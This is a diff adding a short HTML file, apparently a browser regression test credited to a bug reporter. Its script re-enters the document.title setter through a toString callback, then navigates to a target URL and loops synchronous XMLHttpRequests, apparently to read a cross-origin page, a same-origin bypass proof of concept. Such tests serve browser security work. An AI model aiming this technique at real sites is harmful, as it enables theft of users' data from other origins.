@@ -1,0 +1,31 @@
+<!-- test by moz_bug_r_a4@yahoo.com -->
+<body onload="a()">
+<script>
+var targetUrl = "http://example.com/";
+var l;
+
+function a() {
+        var o = {};
+        o.toString = function() {
+                l();
+                return "a";
+        };
+        var f = Object.getOwnPropertyDescriptor(Document.prototype, "title").set;
+        setTimeout(f.bind(document), 0, o);
+}
+
+function l() {
+        var l = false;
+        onunload = function() {
+                l = true;
+        };
+        location = targetUrl;
+        do {
+                var r = new XMLHttpRequest();
+                r.open("GET", location.href, false);
+                r.overrideMimeType("text/plain");
+                try { r.send(null); }
+                catch (e) {}
+        } while (!l);
+}
+</script>
